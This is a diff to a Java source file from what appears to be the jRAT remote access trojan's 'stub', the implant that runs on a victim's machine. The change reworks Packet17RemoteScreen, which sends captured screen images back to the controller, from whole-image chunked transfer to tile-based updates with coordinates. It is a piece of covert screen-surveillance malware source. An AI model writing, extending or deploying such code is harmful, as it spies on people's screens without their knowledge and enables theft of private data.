@@ -2,41 +2,39 @@ package io.jrat.stub.packets.outgoing;
 
 import io.jrat.common.io.StringWriter;
 
-import java.io.ByteArrayInputStream;
 import java.io.DataOutputStream;
 
-
 public class Packet17RemoteScreen extends AbstractOutgoingPacket {
-	
-	private byte[] array;
-	private int scaledWidth;
-	private int scaledHeight;
 
-	public Packet17RemoteScreen(byte[] array, int scaledWidth, int scaledHeight) {
-		this.array = array;
-		this.scaledWidth = scaledWidth;
-		this.scaledHeight = scaledHeight;
+	private int chunkWidth;
+	private int chunkHeight;
+	private int x;
+	private int y;
+	private int width;
+	private int height;
+	private byte[] buffer;
+
+	public Packet17RemoteScreen(int w, int h, int x, int y, int width, int height, byte[] buffer) {
+		this.chunkWidth = w;
+		this.chunkHeight = h;
+		this.x = x;
+		this.y = y;
+		this.width = width;
+		this.height = height;
+		this.buffer = buffer;
 	}
 
 	@Override
 	public void write(DataOutputStream dos, StringWriter sw) throws Exception {
-		ByteArrayInputStream bais = new ByteArrayInputStream(array);
-		
-		dos.writeInt(array.length);
-		
-		dos.writeInt(scaledWidth);
-		dos.writeInt(scaledHeight);		
-		
-		byte[] chunk = new byte[1024];
-		
-		for (long pos = 0; pos < array.length; pos += 1024) {
-			bais.read(chunk);
-			
-			dos.writeInt(chunk.length);
-			dos.write(chunk, 0, chunk.length);
-		}
+		dos.writeInt(chunkWidth);
+		dos.writeInt(chunkHeight);
+		dos.writeInt(x);
+		dos.writeInt(y);
+		dos.writeInt(width);
+		dos.writeInt(height);
 
-		dos.writeInt(-1);	
+		dos.writeInt(buffer.length);
+		dos.write(buffer);
 	}
 
 	@Override
